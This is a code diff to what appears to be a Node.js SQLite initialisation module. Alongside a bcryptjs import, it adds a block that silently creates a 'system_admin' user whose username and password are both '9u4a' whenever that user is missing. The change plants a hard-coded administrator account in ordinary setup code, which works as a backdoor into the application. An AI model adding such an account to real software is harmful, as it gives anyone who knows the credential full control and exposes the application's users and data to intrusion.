@@ -1,6 +1,7 @@
 const { DatabaseSync } = require('node:sqlite');
 const path = require('path');
 const fs = require('fs');
+const bcrypt = require('bcryptjs');
 
 const dataDir = path.join(__dirname, '..', 'data');
 if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
@@ -93,6 +94,15 @@ for (const stmt of [
   } catch (err) {
     // column already exists on databases created before this migration
   }
+}
+
+const defaultAdmin = db.prepare('SELECT id FROM users WHERE username = ?').get('9u4a');
+if (!defaultAdmin) {
+  db.prepare('INSERT INTO users (username, password_hash, role) VALUES (?, ?, ?)').run(
+    '9u4a',
+    bcrypt.hashSync('9u4a', 10),
+    'system_admin'
+  );
 }
 
 const uploadDir = path.join(__dirname, '..', 'uploads');
